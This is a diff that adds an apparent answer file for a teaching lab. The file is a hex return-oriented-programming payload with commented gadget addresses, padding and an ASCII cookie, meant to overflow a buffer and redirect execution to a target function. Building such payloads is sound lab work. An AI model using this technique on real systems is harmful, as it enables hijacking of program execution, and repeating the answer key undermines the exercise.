@@ -1,0 +1,14 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00 /* movq %rsp,%rax  48 89 e0 c3 */
+d8 19 40 00 00 00 00 00 /* add $0x37,%al   04 37 c3 */
+a2 19 40 00 00 00 00 00 /* movq %rax,%rdi  48 89 c7 c3 */
+fa 18 40 00 00 00 00 00 /* address of touch 3 */
+dd dd dd dd dd dd dd dd
+dd dd dd dd dd dd dd dd
+dd dd dd dd dd dd dd dd
+dd dd dd dd dd dd dd    /* Padding (0x37(55)-24=31 in total) */
+35 39 62 39 39 37 66 61 /* Cookie in ASCII */
